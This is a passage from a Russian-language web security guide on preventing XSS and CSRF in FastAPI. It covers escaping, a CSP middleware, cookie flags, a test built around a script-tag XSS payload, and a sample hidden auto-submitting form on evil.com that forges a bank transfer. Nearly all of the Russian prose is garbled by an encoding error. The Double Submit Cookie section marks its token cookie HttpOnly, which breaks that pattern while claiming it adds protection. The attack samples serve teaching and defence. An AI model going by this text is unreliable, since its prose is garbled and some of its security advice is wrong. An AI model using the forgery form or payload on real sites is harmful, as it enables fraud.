- –ü—Ä–µ–æ–±—Ä–∞–∑—É–µ–º —Å–ø–µ—Ü–∏–∞–ª—å–Ω—ã–µ —Å–∏–º–≤–æ–ª—ã –≤ –±–µ–∑–æ–ø–∞—Å–Ω—ã–µ HTML —Å—É—â–Ω–æ—Å—Ç–∏
- `<` —Å—Ç–∞–Ω–æ–≤–∏—Ç—Å—è `&lt;`
- `>` —Å—Ç–∞–Ω–æ–≤–∏—Ç—Å—è `&gt;`
- `&` —Å—Ç–∞–Ω–æ–≤–∏—Ç—Å—è `&amp;`

**–ü—Ä–∏–º–µ—Ä:**
```python
import html

# ‚ùå –û–ü–ê–°–ù–û - –ø—Ä—è–º–æ–π –≤—ã–≤–æ–¥ –±–µ–∑ —ç–∫—Ä–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è
def render_user_input(user_input: str) -> str:
    return f"<div>{user_input}</div>"  # XSS —É—è–∑–≤–∏–º–æ—Å—Ç—å!

# ‚úÖ –ë–ï–ó–û–ü–ê–°–ù–û - —ç–∫—Ä–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ
def render_user_input(user_input: str) -> str:
    escaped = html.escape(user_input)
    return f"<div>{escaped}</div>"

# –î–ª—è –±–æ–ª–µ–µ —Å–ª–æ–∂–Ω—ã—Ö —Å–ª—É—á–∞–µ–≤ –∏—Å–ø–æ–ª—å–∑—É–π—Ç–µ –±–∏–±–ª–∏–æ—Ç–µ–∫–∏
from markupsafe import Markup, escape

def render_comment(comment: str, allow_html: bool = False) -> str:
    if allow_html:
        # –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ –±–∏–±–ª–∏–æ—Ç–µ–∫—É bleach –¥–ª—è –±–µ–∑–æ–ø–∞—Å–Ω–æ–≥–æ HTML
        import bleach
        allowed_tags = ['p', 'br', 'strong', 'em']
        return bleach.clean(comment, tags=allowed_tags)
    else:
        return escape(comment)
```

**3. CSP (Content Security Policy)**

**–ö–∞–∫ —ç—Ç–æ —Ä–∞–±–æ—Ç–∞–µ—Ç:**
- CSP - —ç—Ç–æ –∑–∞–≥–æ–ª–æ–≤–æ–∫, –∫–æ—Ç–æ—Ä—ã–π –≥–æ–≤–æ—Ä–∏—Ç –±—Ä–∞—É–∑–µ—Ä—É, –æ—Ç–∫—É–¥–∞ –º–æ–∂–Ω–æ –∑–∞–≥—Ä—É–∂–∞—Ç—å —Ä–µ—Å—É—Ä—Å—ã
- –ë–ª–æ–∫–∏—Ä—É–µ—Ç –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ inline —Å–∫—Ä–∏–ø—Ç–æ–≤
- –û–≥—Ä–∞–Ω–∏—á–∏–≤–∞–µ—Ç –∏—Å—Ç–æ—á–Ω–∏–∫–∏ —Å–∫—Ä–∏–ø—Ç–æ–≤, —Å—Ç–∏–ª–µ–π, –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–π
- –î–∞–∂–µ –µ—Å–ª–∏ –∑–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫ –≤–Ω–µ–¥—Ä–∏—Ç –∫–æ–¥, –±—Ä–∞—É–∑–µ—Ä –µ–≥–æ –Ω–µ –≤—ã–ø–æ–ª–Ω–∏—Ç

**–ê–Ω–∞–ª–æ–≥–∏—è:** –≠—Ç–æ –∫–∞–∫ —Å–ø–∏—Å–æ–∫ —Ä–∞–∑—Ä–µ—à–µ–Ω–Ω—ã—Ö –ø–æ—Å—Ç–∞–≤—â–∏–∫–æ–≤. –î–∞–∂–µ –µ—Å–ª–∏ –∫—Ç–æ-—Ç–æ –ø–æ–ø—ã—Ç–∞–µ—Ç—Å—è –ø—Ä–∏–Ω–µ—Å—Ç–∏ —Ç–æ–≤–∞—Ä –æ—Ç –Ω–µ—Ä–∞–∑—Ä–µ—à–µ–Ω–Ω–æ–≥–æ –ø–æ—Å—Ç–∞–≤—â–∏–∫–∞, –µ–≥–æ –Ω–µ –ø—Ä–∏–º—É—Ç.

**–ü—Ä–∏–º–µ—Ä –Ω–∞—Å—Ç—Ä–æ–π–∫–∏:**
```python
from fastapi import FastAPI, Response
from starlette.middleware.base import BaseHTTPMiddleware

class CSPMiddleware(BaseHTTPMiddleware):
    """Middleware –¥–ª—è –¥–æ–±–∞–≤–ª–µ–Ω–∏—è Content Security Policy"""
    
    async def dispatch(self, request, call_next):
        response = await call_next(request)
        
        # –°—Ç—Ä–æ–≥–∞—è –ø–æ–ª–∏—Ç–∏–∫–∞ CSP
        csp_policy = (
            "default-src 'self'; "  # –ü–æ —É–º–æ–ª—á–∞–Ω–∏—é —Ç–æ–ª—å–∫–æ —Å —Ç–æ–≥–æ –∂–µ –¥–æ–º–µ–Ω–∞
            "script-src 'self'; "   # –°–∫—Ä–∏–ø—Ç—ã —Ç–æ–ª—å–∫–æ —Å —Ç–æ–≥–æ –∂–µ –¥–æ–º–µ–Ω–∞ (–±–µ–∑ 'unsafe-inline'!)
            "style-src 'self' 'unsafe-inline'; "  # –°—Ç–∏–ª–∏ –º–æ–∂–Ω–æ inline (–¥–ª—è —É–¥–æ–±—Å—Ç–≤–∞)
            "img-src 'self' data: https:; "  # –ò–∑–æ–±—Ä–∞–∂–µ–Ω–∏—è —Å —Ç–æ–≥–æ –∂–µ –¥–æ–º–µ–Ω–∞, data: –∏ https:
            "font-src 'self' data:; "  # –®—Ä–∏—Ñ—Ç—ã
            "connect-src 'self'; "  # AJAX –∑–∞–ø—Ä–æ—Å—ã —Ç–æ–ª—å–∫–æ –Ω–∞ —Ç–æ—Ç –∂–µ –¥–æ–º–µ–Ω
            "frame-ancestors 'none'; "  # –ó–∞–ø—Ä–µ—Ç –≤—Å—Ç—Ä–∞–∏–≤–∞–Ω–∏—è –≤ iframe
            "base-uri 'self'; "  # <base> —Ç–µ–≥ —Ç–æ–ª—å–∫–æ —Å —Ç–æ–≥–æ –∂–µ –¥–æ–º–µ–Ω–∞
            "form-action 'self'; "  # –§–æ—Ä–º—ã –º–æ–∂–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª—è—Ç—å —Ç–æ–ª—å–∫–æ –Ω–∞ —Ç–æ—Ç –∂–µ –¥–æ–º–µ–Ω
            "upgrade-insecure-requests;"  # –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–æ–µ –æ–±–Ω–æ–≤–ª–µ–Ω–∏–µ HTTP –¥–æ HTTPS
        )
        
        response.headers["Content-Security-Policy"] = csp_policy
        
        # –î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–µ –∑–∞–≥–æ–ª–æ–≤–∫–∏ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏
        response.headers["X-Content-Type-Options"] = "nosniff"
        response.headers["X-Frame-Options"] = "DENY"
        response.headers["X-XSS-Protection"] = "1; mode=block"
        
        return response

app.add_middleware(CSPMiddleware)
```

**4. HttpOnly cookies**

**–ö–∞–∫ —ç—Ç–æ —Ä–∞–±–æ—Ç–∞–µ—Ç:**
- Cookie —Å —Ñ–ª–∞–≥–æ–º `HttpOnly` –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω —á–µ—Ä–µ–∑ JavaScript
- –î–∞–∂–µ –µ—Å–ª–∏ –∑–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫ –≤–Ω–µ–¥—Ä–∏—Ç XSS –∫–æ–¥, –æ–Ω –Ω–µ —Å–º–æ–∂–µ—Ç –ø—Ä–æ—á–∏—Ç–∞—Ç—å cookie
- Cookie –æ—Ç–ø—Ä–∞–≤–ª—è–µ—Ç—Å—è —Ç–æ–ª—å–∫–æ –Ω–∞ —Å–µ—Ä–≤–µ—Ä —á–µ—Ä–µ–∑ HTTP –∑–∞–≥–æ–ª–æ–≤–∫–∏

**–ü—Ä–∏–º–µ—Ä:**
```python
from fastapi import Response

# ‚úÖ –ë–ï–ó–û–ü–ê–°–ù–û - HttpOnly cookie
response.set_cookie(
    key="access_token",
    value=token,
    httponly=True,  # –ù–µ–¥–æ—Å—Ç—É–ø–µ–Ω —á–µ—Ä–µ–∑ document.cookie
    samesite="lax",
    secure=True
)

# ‚ùå –û–ü–ê–°–ù–û - cookie –¥–æ—Å—Ç—É–ø–µ–Ω —á–µ—Ä–µ–∑ JavaScript
response.set_cookie(
    key="access_token",
    value=token,
    httponly=False  # –î–æ—Å—Ç—É–ø–µ–Ω —á–µ—Ä–µ–∑ JavaScript - XSS –º–æ–∂–µ—Ç –µ–≥–æ —É–∫—Ä–∞—Å—Ç—å!
)
```

**5. –î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–µ –º–µ—Ä—ã –∑–∞—â–∏—Ç—ã:**

**–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –±–µ–∑–æ–ø–∞—Å–Ω—ã—Ö –±–∏–±–ª–∏–æ—Ç–µ–∫:**
```python
# –î–ª—è –æ—á–∏—Å—Ç–∫–∏ HTML –∏—Å–ø–æ–ª—å–∑—É–π—Ç–µ bleach
import bleach

# –†–∞–∑—Ä–µ—à–∞–µ–º —Ç–æ–ª—å–∫–æ –±–µ–∑–æ–ø–∞—Å–Ω—ã–µ —Ç–µ–≥–∏ –∏ –∞—Ç—Ä–∏–±—É—Ç—ã
allowed_tags = ['p', 'br', 'strong', 'em', 'a']
allowed_attributes = {'a': ['href', 'title']}

cleaned = bleach.clean(
    user_input,
    tags=allowed_tags,
    attributes=allowed_attributes,
    strip=True  # –£–¥–∞–ª—è–µ–º –Ω–µ—Ä–∞–∑—Ä–µ—à–µ–Ω–Ω—ã–µ —Ç–µ–≥–∏
)

# –î–ª—è —à–∞–±–ª–æ–Ω–æ–≤ –∏—Å–ø–æ–ª—å–∑—É–π—Ç–µ –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–æ–µ —ç–∫—Ä–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ
# Jinja2 –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ —ç–∫—Ä–∞–Ω–∏—Ä—É–µ—Ç –ø–µ—Ä–µ–º–µ–Ω–Ω—ã–µ
# {{ user_input }} - –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ —ç–∫—Ä–∞–Ω–∏—Ä—É–µ—Ç—Å—è
# {{ user_input|safe }} - —è–≤–Ω–æ —Ä–∞–∑—Ä–µ—à–∞–µ–º HTML (—Ç–æ–ª—å–∫–æ –µ—Å–ª–∏ –¥–æ–≤–µ—Ä—è–µ—Ç–µ –∏—Å—Ç–æ—á–Ω–∏–∫—É)
```

**–ü—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞ XSS –≤ —Ç–µ—Å—Ç–∞—Ö:**
```python
import pytest
from fastapi.testclient import TestClient

def test_xss_protection():
    """–¢–µ—Å—Ç –∑–∞—â–∏—Ç—ã –æ—Ç XSS"""
    client = TestClient(app)
    
    # –ü—ã—Ç–∞–µ–º—Å—è –≤–Ω–µ–¥—Ä–∏—Ç—å XSS
    xss_payload = "<script>alert('XSS')</script>"
    
    response = client.post("/comments", json={"text": xss_payload})
    
    # –ü—Ä–æ–≤–µ—Ä—è–µ–º, —á—Ç–æ —Å–∫—Ä–∏–ø—Ç —ç–∫—Ä–∞–Ω–∏—Ä–æ–≤–∞–Ω
    assert "<script>" not in response.text
    assert "&lt;script&gt;" in response.text  # –î–æ–ª–∂–Ω–æ –±—ã—Ç—å —ç–∫—Ä–∞–Ω–∏—Ä–æ–≤–∞–Ω–æ
```

**–†–µ–∫–æ–º–µ–Ω–¥–∞—Ü–∏–∏:**
- –í—Å–µ–≥–¥–∞ –≤–∞–ª–∏–¥–∏—Ä—É–π—Ç–µ –∏ —ç–∫—Ä–∞–Ω–∏—Ä—É–π—Ç–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–∏–π –≤–≤–æ–¥
- –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ CSP —Å –º–∞–∫—Å–∏–º–∞–ª—å–Ω–æ —Å—Ç—Ä–æ–≥–∏–º–∏ –Ω–∞—Å—Ç—Ä–æ–π–∫–∞–º–∏
- –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–π—Ç–µ HttpOnly –¥–ª—è –≤—Å–µ—Ö cookies —Å —Ç–æ–∫–µ–Ω–∞–º–∏
- –†–µ–≥—É–ª—è—Ä–Ω–æ –ø—Ä–æ–≤–µ—Ä—è–π—Ç–µ –∫–æ–¥ –Ω–∞ XSS —É—è–∑–≤–∏–º–æ—Å—Ç–∏
- –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏–µ –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—ã (SAST/DAST) –¥–ª—è –ø–æ–∏—Å–∫–∞ —É—è–∑–≤–∏–º–æ—Å—Ç–µ–π

#### **4. CSRF (Cross-Site Request Forgery) - –ú–µ–∂—Å–∞–π—Ç–æ–≤–∞—è –ø–æ–¥–¥–µ–ª–∫–∞ –∑–∞–ø—Ä–æ—Å–æ–≤**

**–ß—Ç–æ —ç—Ç–æ:**
CSRF ‚Äî —ç—Ç–æ –∞—Ç–∞–∫–∞, –ø—Ä–∏ –∫–æ—Ç–æ—Ä–æ–π –∑–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫ –∑–∞—Å—Ç–∞–≤–ª—è–µ—Ç –∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω–Ω–æ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –≤—ã–ø–æ–ª–Ω–∏—Ç—å –Ω–µ–∂–µ–ª–∞—Ç–µ–ª—å–Ω–æ–µ –¥–µ–π—Å—Ç–≤–∏–µ –Ω–∞ –≤–µ–±-—Å–∞–π—Ç–µ, –≥–¥–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å —É–∂–µ –≤–æ—à–µ–ª –≤ —Å–∏—Å—Ç–µ–º—É.

**–ê–Ω–∞–ª–æ–≥–∏—è:**
–ü—Ä–µ–¥—Å—Ç–∞–≤—å—Ç–µ, —á—Ç–æ –≤—ã –∑–∞—à–ª–∏ –≤ –±–∞–Ω–∫ –∏ –æ—Å—Ç–∞–≤–∏–ª–∏ —Å–≤–æ—é –ø–æ–¥–ø–∏—Å—å –Ω–∞ –±–ª–∞–Ω–∫–µ. –ü–æ–∫–∞ –≤—ã –Ω–µ –≤—ã—à–ª–∏ –∏–∑ –±–∞–Ω–∫–∞, –∑–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫ –º–æ–∂–µ—Ç –≤–∑—è—Ç—å —ç—Ç–æ—Ç –±–ª–∞–Ω–∫ —Å –≤–∞—à–µ–π –ø–æ–¥–ø–∏—Å—å—é –∏ –Ω–∞–ø–∏—Å–∞—Ç—å –Ω–∞ –Ω–µ–º –ø–µ—Ä–µ–≤–æ–¥ –¥–µ–Ω–µ–≥ –Ω–∞ —Å–≤–æ–π —Å—á–µ—Ç. –ë–∞–Ω–∫ (–≤–µ–±-—Å–∞–π—Ç) –≤–∏–¥–∏—Ç –≤–∞—à—É –ø–æ–¥–ø–∏—Å—å (–∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—é) –∏ –≤—ã–ø–æ–ª–Ω—è–µ—Ç –¥–µ–π—Å—Ç–≤–∏–µ, —Ö–æ—Ç—è –≤—ã –µ–≥–æ –Ω–µ —Ö–æ—Ç–µ–ª–∏.

**–ö–∞–∫ —ç—Ç–æ —Ä–∞–±–æ—Ç–∞–µ—Ç (–ø—Ä–∏–º–µ—Ä –∞—Ç–∞–∫–∏):**

1. –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –∑–∞—Ö–æ–¥–∏—Ç –Ω–∞ —Å–∞–π—Ç `bank.com` –∏ –∞–≤—Ç–æ—Ä–∏–∑—É–µ—Ç—Å—è
2. –ë–∞–Ω–∫ —Å–æ—Ö—Ä–∞–Ω—è–µ—Ç cookie —Å —Ç–æ–∫–µ–Ω–æ–º –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏ –≤ –±—Ä–∞—É–∑–µ—Ä–µ
3. –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –æ—Ç–∫—Ä—ã–≤–∞–µ—Ç –¥—Ä—É–≥—É—é –≤–∫–ª–∞–¥–∫—É –∏ –∑–∞—Ö–æ–¥–∏—Ç –Ω–∞ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã–π —Å–∞–π—Ç `evil.com`
4. –°–∞–π—Ç `evil.com` —Å–æ–¥–µ—Ä–∂–∏—Ç —Å–∫—Ä—ã—Ç—É—é —Ñ–æ—Ä–º—É, –∫–æ—Ç–æ—Ä–∞—è –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –æ—Ç–ø—Ä–∞–≤–ª—è–µ—Ç –∑–∞–ø—Ä–æ—Å –Ω–∞ `bank.com`:
   ```html
   <!-- –ù–∞ —Å–∞–π—Ç–µ evil.com -->
   <form action="https://bank.com/transfer" method="POST" id="evil-form">
     <input type="hidden" name="to_account" value="hacker_account">
     <input type="hidden" name="amount" value="10000">
   </form>
   <script>
     // –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º —Ñ–æ—Ä–º—É
     document.getElementById('evil-form').submit();
   </script>
   ```
5. –ë—Ä–∞—É–∑–µ—Ä –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –æ—Ç–ø—Ä–∞–≤–ª—è–µ—Ç cookie —Å –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–µ–π –≤–º–µ—Å—Ç–µ —Å –∑–∞–ø—Ä–æ—Å–æ–º
6. –ë–∞–Ω–∫ –≤–∏–¥–∏—Ç –∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω–Ω—ã–π –∑–∞–ø—Ä–æ—Å –∏ –≤—ã–ø–æ–ª–Ω—è–µ—Ç –ø–µ—Ä–µ–≤–æ–¥ –¥–µ–Ω–µ–≥
7. –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –¥–∞–∂–µ –Ω–µ –∑–Ω–∞–µ—Ç, —á—Ç–æ –ø—Ä–æ–∏–∑–æ—à–ª–æ!

**–ö–∞–∫ –∑–∞—â–∏—Ç–∏—Ç—å—Å—è:**

**1. CSRF —Ç–æ–∫–µ–Ω—ã (—Å–∞–º—ã–π –Ω–∞–¥–µ–∂–Ω—ã–π —Å–ø–æ—Å–æ–±)**

**–ö–∞–∫ —ç—Ç–æ —Ä–∞–±–æ—Ç–∞–µ—Ç:**
- –°–µ—Ä–≤–µ—Ä –≥–µ–Ω–µ—Ä–∏—Ä—É–µ—Ç —É–Ω–∏–∫–∞–ª—å–Ω—ã–π —Ç–æ–∫–µ–Ω –¥–ª—è –∫–∞–∂–¥–æ–π —Ñ–æ—Ä–º—ã
- –¢–æ–∫–µ–Ω —Å–æ—Ö—Ä–∞–Ω—è–µ—Ç—Å—è –≤ —Å–µ—Å—Å–∏–∏ –Ω–∞ —Å–µ—Ä–≤–µ—Ä–µ
- –¢–æ–∫–µ–Ω –¥–æ–±–∞–≤–ª—è–µ—Ç—Å—è –≤ —Å–∫—Ä—ã—Ç–æ–µ –ø–æ–ª–µ —Ñ–æ—Ä–º—ã
- –ü—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ —Ñ–æ—Ä–º—ã —Å–µ—Ä–≤–µ—Ä –ø—Ä–æ–≤–µ—Ä—è–µ—Ç, —á—Ç–æ —Ç–æ–∫–µ–Ω —Å–æ–≤–ø–∞–¥–∞–µ—Ç
- –ó–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫ –Ω–µ –∑–Ω–∞–µ—Ç —Ç–æ–∫–µ–Ω, –ø–æ—ç—Ç–æ–º—É –Ω–µ –º–æ–∂–µ—Ç –ø–æ–¥–¥–µ–ª–∞—Ç—å –∑–∞–ø—Ä–æ—Å

**–ê–Ω–∞–ª–æ–≥–∏—è:** –≠—Ç–æ –∫–∞–∫ –ø–∞—Ä–æ–ª—å –Ω–∞ –±–ª–∞–Ω–∫–µ. –î–∞–∂–µ –µ—Å–ª–∏ –∑–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫ –≤–∏–¥–∏—Ç –±–ª–∞–Ω–∫ —Å –≤–∞—à–µ–π –ø–æ–¥–ø–∏—Å—å—é, –æ–Ω –Ω–µ –∑–Ω–∞–µ—Ç –ø–∞—Ä–æ–ª—å, –ø–æ—ç—Ç–æ–º—É –±–∞–Ω–∫ –Ω–µ –ø—Ä–∏–º–µ—Ç –±–ª–∞–Ω–∫.

**–ü—Ä–∏–º–µ—Ä —Ä–µ–∞–ª–∏–∑–∞—Ü–∏–∏:**
```python
# –ì–µ–Ω–µ—Ä–∞—Ü–∏—è CSRF —Ç–æ–∫–µ–Ω–∞
import secrets

def generate_csrf_token() -> str:
    return secrets.token_urlsafe(32)

# –°–æ—Ö—Ä–∞–Ω–µ–Ω–∏–µ —Ç–æ–∫–µ–Ω–∞ –≤ —Å–µ—Å—Å–∏–∏
request.session['csrf_token'] = generate_csrf_token()

# –í —Ñ–æ—Ä–º–µ (HTML)
# <input type="hidden" name="csrf_token" value="{{ csrf_token }}">

# –ü—Ä–æ–≤–µ—Ä–∫–∞ —Ç–æ–∫–µ–Ω–∞ –ø—Ä–∏ –æ–±—Ä–∞–±–æ—Ç–∫–µ —Ñ–æ—Ä–º—ã
if form_data.csrf_token != request.session.get('csrf_token'):
    raise HTTPException(status_code=403, detail="Invalid CSRF token")
```

**2. SameSite cookies**

**–ö–∞–∫ —ç—Ç–æ —Ä–∞–±–æ—Ç–∞–µ—Ç:**
- –ë—Ä–∞—É–∑–µ—Ä –Ω–µ –æ—Ç–ø—Ä–∞–≤–ª—è–µ—Ç cookie, –µ—Å–ª–∏ –∑–∞–ø—Ä–æ—Å –ø—Ä–∏—à–µ–ª —Å –¥—Ä—É–≥–æ–≥–æ —Å–∞–π—Ç–∞
- `SameSite=Strict` - cookie –Ω–∏–∫–æ–≥–¥–∞ –Ω–µ –æ—Ç–ø—Ä–∞–≤–ª—è–µ—Ç—Å—è —Å –¥—Ä—É–≥–∏—Ö —Å–∞–π—Ç–æ–≤
- `SameSite=Lax` - cookie –æ—Ç–ø—Ä–∞–≤–ª—è–µ—Ç—Å—è —Ç–æ–ª—å–∫–æ –ø—Ä–∏ GET –∑–∞–ø—Ä–æ—Å–∞—Ö —Å –¥—Ä—É–≥–∏—Ö —Å–∞–π—Ç–æ–≤ (–∫–æ–º–ø—Ä–æ–º–∏—Å—Å –º–µ–∂–¥—É –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç—å—é –∏ —É–¥–æ–±—Å—Ç–≤–æ–º)

**–ê–Ω–∞–ª–æ–≥–∏—è:** –≠—Ç–æ –∫–∞–∫ –ø—Ä–æ–ø—É—Å–∫, –∫–æ—Ç–æ—Ä—ã–π —Ä–∞–±–æ—Ç–∞–µ—Ç —Ç–æ–ª—å–∫–æ –≤ –≤–∞—à–µ–º –∑–¥–∞–Ω–∏–∏. –î–∞–∂–µ –µ—Å–ª–∏ –∫—Ç–æ-—Ç–æ –ø–æ–ø—ã—Ç–∞–µ—Ç—Å—è –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –µ–≥–æ –≤ –¥—Ä—É–≥–æ–º –∑–¥–∞–Ω–∏–∏, –æ–Ω –Ω–µ —Å—Ä–∞–±–æ—Ç–∞–µ—Ç.

**–ü—Ä–∏–º–µ—Ä:**
```python
# –í FastAPI –ø—Ä–∏ —É—Å—Ç–∞–Ω–æ–≤–∫–µ cookies
response.set_cookie(
    key="access_token",
    value=token,
    httponly=True,      # –ù–µ–¥–æ—Å—Ç—É–ø–µ–Ω —á–µ—Ä–µ–∑ JavaScript
    samesite="lax",     # –ó–∞—â–∏—Ç–∞ –æ—Ç CSRF
    secure=True         # –¢–æ–ª—å–∫–æ —á–µ—Ä–µ–∑ HTTPS
)

# –ó–Ω–∞—á–µ–Ω–∏—è SameSite:
# - "strict" - –º–∞–∫—Å–∏–º–∞–ª—å–Ω–∞—è –∑–∞—â–∏—Ç–∞, –Ω–æ –º–æ–∂–µ—Ç –±—ã—Ç—å –Ω–µ—É–¥–æ–±–Ω–æ
# - "lax" - –±–∞–ª–∞–Ω—Å –º–µ–∂–¥—É –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç—å—é –∏ —É–¥–æ–±—Å—Ç–≤–æ–º (—Ä–µ–∫–æ–º–µ–Ω–¥—É–µ—Ç—Å—è)
# - "none" - –Ω–µ—Ç –∑–∞—â–∏—Ç—ã (—Ç—Ä–µ–±—É–µ—Ç secure=True)
```

**3. –ü—Ä–æ–≤–µ—Ä–∫–∞ Origin/Referer –∑–∞–≥–æ–ª–æ–≤–∫–æ–≤**

**–ö–∞–∫ —ç—Ç–æ —Ä–∞–±–æ—Ç–∞–µ—Ç:**
- –ë—Ä–∞—É–∑–µ—Ä –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –¥–æ–±–∞–≤–ª—è–µ—Ç –∑–∞–≥–æ–ª–æ–≤–æ–∫ `Origin` –∏–ª–∏ `Referer` –∫ –∑–∞–ø—Ä–æ—Å–∞–º
- –°–µ—Ä–≤–µ—Ä –ø—Ä–æ–≤–µ—Ä—è–µ—Ç, —á—Ç–æ –∑–∞–ø—Ä–æ—Å –ø—Ä–∏—à–µ–ª —Å –ø—Ä–∞–≤–∏–ª—å–Ω–æ–≥–æ –¥–æ–º–µ–Ω–∞
- –ï—Å–ª–∏ –∑–∞–≥–æ–ª–æ–≤–æ–∫ –æ—Ç—Å—É—Ç—Å—Ç–≤—É–µ—Ç –∏–ª–∏ –Ω–µ–≤–µ—Ä–Ω—ã–π - –∑–∞–ø—Ä–æ—Å –æ—Ç–∫–ª–æ–Ω—è–µ—Ç—Å—è

**–ü—Ä–∏–º–µ—Ä:**
```python
from fastapi import Request, HTTPException

def check_csrf_origin(request: Request):
    """–ü—Ä–æ–≤–µ—Ä–∫–∞ Origin –∑–∞–≥–æ–ª–æ–≤–∫–∞ –¥–ª—è –∑–∞—â–∏—Ç—ã –æ—Ç CSRF"""
    origin = request.headers.get("Origin")
    referer = request.headers.get("Referer")
    
    allowed_origins = ["https://yourdomain.com", "https://app.yourdomain.com"]
    
    if origin:
        if origin not in allowed_origins:
            raise HTTPException(
                status_code=403,
                detail="CSRF: Invalid Origin header"
            )
    elif referer:
        # –ü—Ä–æ–≤–µ—Ä—è–µ–º Referer –∫–∞–∫ fallback
        if not any(allowed in referer for allowed in allowed_origins):
            raise HTTPException(
                status_code=403,
                detail="CSRF: Invalid Referer header"
            )
    else:
        # –î–ª—è POST/PUT/DELETE –∑–∞–ø—Ä–æ—Å–æ–≤ Origin –æ–±—è–∑–∞—Ç–µ–ª–µ–Ω
        if request.method in ["POST", "PUT", "DELETE", "PATCH"]:
            raise HTTPException(
                status_code=403,
                detail="CSRF: Missing Origin/Referer header"
            )

# –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –≤ endpoint
@router.post("/transfer")
async def transfer_money(
    request: Request,
    transfer_data: TransferData
):
    check_csrf_origin(request)  # –ü—Ä–æ–≤–µ—Ä–∫–∞ –ø–µ—Ä–µ–¥ –æ–±—Ä–∞–±–æ—Ç–∫–æ–π
    # ... –æ—Å—Ç–∞–ª—å–Ω–∞—è –ª–æ–≥–∏–∫–∞
```

**4. Double Submit Cookie**

**–ö–∞–∫ —ç—Ç–æ —Ä–∞–±–æ—Ç–∞–µ—Ç:**
- –¢–æ–∫–µ–Ω —Å–æ—Ö—Ä–∞–Ω—è–µ—Ç—Å—è –∏ –≤ cookie, –∏ –≤ —Ç–µ–ª–µ –∑–∞–ø—Ä–æ—Å–∞ (–∏–ª–∏ –∑–∞–≥–æ–ª–æ–≤–∫–µ)
- –°–µ—Ä–≤–µ—Ä —Å—Ä–∞–≤–Ω–∏–≤–∞–µ—Ç –∑–Ω–∞—á–µ–Ω–∏—è –∏–∑ cookie –∏ –∏–∑ –∑–∞–ø—Ä–æ—Å–∞
- –ï—Å–ª–∏ –æ–Ω–∏ —Å–æ–≤–ø–∞–¥–∞—é—Ç - –∑–∞–ø—Ä–æ—Å –ª–µ–≥–∏—Ç–∏–º–Ω—ã–π
- –ó–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫ –Ω–µ –º–æ–∂–µ—Ç –ø—Ä–æ—á–∏—Ç–∞—Ç—å cookie (HttpOnly), –ø–æ—ç—Ç–æ–º—É –Ω–µ –º–æ–∂–µ—Ç –ø–æ–¥–¥–µ–ª–∞—Ç—å —Ç–æ–∫–µ–Ω

**–ü—Ä–∏–º–µ—Ä:**
```python
# –ì–µ–Ω–µ—Ä–∞—Ü–∏—è —Ç–æ–∫–µ–Ω–∞
csrf_token = secrets.token_urlsafe(32)

# –°–æ—Ö—Ä–∞–Ω–µ–Ω–∏–µ –≤ cookie
response.set_cookie(
    key="csrf_token",
    value=csrf_token,
    httponly=True,  # –ù–µ–¥–æ—Å—Ç—É–ø–µ–Ω —á–µ—Ä–µ–∑ JavaScript
    samesite="lax",
    secure=True
)

# –¢–æ–∫–µ–Ω —Ç–∞–∫–∂–µ –æ—Ç–ø—Ä–∞–≤–ª—è–µ—Ç—Å—è –≤ –∑–∞–≥–æ–ª–æ–≤–∫–µ –∏–ª–∏ —Ç–µ–ª–µ –∑–∞–ø—Ä–æ—Å–∞
